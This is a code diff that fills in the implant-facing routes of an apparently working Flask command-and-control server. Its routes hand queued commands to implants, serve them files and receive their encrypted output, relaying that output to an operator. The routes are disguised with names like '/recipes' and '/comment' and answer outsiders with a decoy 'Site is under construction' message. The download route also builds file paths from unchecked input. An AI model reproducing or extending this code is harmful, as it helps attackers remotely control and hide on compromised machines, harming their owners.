@@ -3,7 +3,7 @@ from modules import server_codes
 from modules import storage
 from datetime import datetime
 import os
-from flask import Flask, request, make_response, jsonify
+from flask import Flask, current_app, request, make_response, jsonify, send_from_directory, send_file
 from werkzeug.utils import secure_filename
 from typing import Dict
 import random
@@ -91,6 +91,8 @@ def implant_register():
 
         # Generate a name
         new_implant_name = encryption.id_generator(N=4)
+        # Print for debug
+        print(new_implant_name)
 
         # Add the new implant to the implant_db
         implant_db.add_implant(storage.Implant(name=new_implant_name,
@@ -117,17 +119,70 @@ def implant_register():
 # The command recieve route for implants
 @app.route("/recipes")
 def implant_command():
-    return "TODO"
+    # Read the Cookie header for the implant name
+    implant_name = request.headers['Cookie']
+    
+    if implant_name not in implant_db.dict:
+        return "Site is under construction"
+    
+    if len(implant_db.dict[implant_name].command_queue) > 0:
+        new_cmd = implant_db.dict[implant_name].pop_command()
+
+        resp = make_response(new_cmd)
+        return resp
+
+    return "0"
 
 # The file download route for implants
 @app.route("/recipes/download/<FILE_ID>")
 def implant_download(FILE_ID):
-    return "TODO"
-
+    try:
+        uploads = os.path.join(current_app.root_path, app.config['UPLOAD_FOLDER'])
+        file_path = os.path.join(uploads, FILE_ID)
+        return send_file(file_path, as_attachment=True)
+    except:
+        return "There was an error with file download..."
+ 
 # The response route for output from implants
 @app.route("/comment", methods=['POST'])
 def implant_response():
-    return "TODO"
+
+    # Read in Base64 post data
+    aes_data = request.get_data()
+
+    # Decrypt it
+    data = ""
+    try:
+        data = AES_INSTANCE.decrypt(aes_data)
+    except:
+        print("There was an error decrypting the message from an implant trying to log in. Please make sure the payload was generated with the same key as the listener")
+
+    implant_name = request.headers["Cookie"]
+    # If not signed in, do nothing, return
+    if implant_name not in implant_db.dict:
+        return "Site is under construction"
+    
+    data = data.split(":::")
+    ID = data[0]
+
+    # Edit the command_db
+    commandlog_db.dict[ID].command.output = data[1]
+    commandlog_db.dict[ID].response_timestamp = datetime.now()
+
+    # Build a json-able dict to send back to the operator
+    r = { "command": commandlog_db.dict[ID].command.__dict__,
+          "sent_timestamp": str(commandlog_db.dict[ID].sent_timestamp),
+          "response_timestamp": str(commandlog_db.dict[ID].response_timestamp)
+        }
+
+    # Send the response back to the operator
+    op = commandlog_db.dict[ID].operator
+    data = {"update_type": "NEW_COMMAND_RESPONSE", "update_data": r}
+    resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
+
+    
+    ret = make_response(encryption.id_generator(random.randint(200,350)))
+    return ret
 
 # Operator connects to this endpoint to login
 @app.route("/admin/login", methods=['POST'])
@@ -191,6 +246,7 @@ def str_command():
 
     # Get the command string and decode from bytes
     cmd_str = request.form['cmd_str']
+    print(cmd_str)
 
     # If there is a command involving a file
     # if not, just save the command string and log it in the commandlog_db
@@ -208,11 +264,10 @@ def str_command():
             file_bytes = file.read()
             # Need to decode it from bytes first to get it to work in the encryptin 
             enc_file = AES_INSTANCE.encrypt(file_bytes)
+            # Save the file in the path specified in the config at top of file
             with open(os.path.join(app.config['UPLOAD_FOLDER'], file_id), "wb") as f:
                 f.write(enc_file)
 
-            # Save the file in the path specified in the config at top of file
-            # file.save(os.path.join(app.config['UPLOAD_FOLDER'], file_id))
 
         # If server fails to save for any reason, return ERR_UPLOAD_EXCEPTION
         except Exception as err:
